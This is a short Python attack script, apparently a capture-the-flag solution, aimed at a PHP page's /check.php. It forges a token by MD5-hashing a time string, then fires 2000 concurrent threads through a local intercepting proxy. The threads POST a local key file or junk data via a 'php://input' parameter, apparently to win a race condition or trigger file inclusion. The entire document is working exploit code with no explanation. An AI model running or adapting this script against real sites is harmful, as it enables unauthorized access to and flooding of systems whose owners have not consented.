import requests,threading,hashlib
proxies = {
      "http": "http://127.0.0.1:8080",
      "https": "http://127.0.0.1:8080",
}
minute=hashlib.md5(input("输入时分").encode()).hexdigest()
url=input("输入网址")+"/check.php?token="+minute+"&php://input"
with open("C:\\Users\\whb\\Downloads\\key (1).dat","rb")as f:
    data1=f.read()
    data2=b"mmmmmmm"
def func(data):
    reponse=requests.post(url=url,data=data,proxies=proxies,verify=False)
    with lock:
        print(reponse.text+"\n")
thred=[]
for i in range(1000):
    thred.append(threading.Thread(target=func,args=(data1,)))
    thred.append(threading.Thread(target=func,args=(data2,)))
lock=threading.Lock()
for i in range(2000): thred[i].start()
    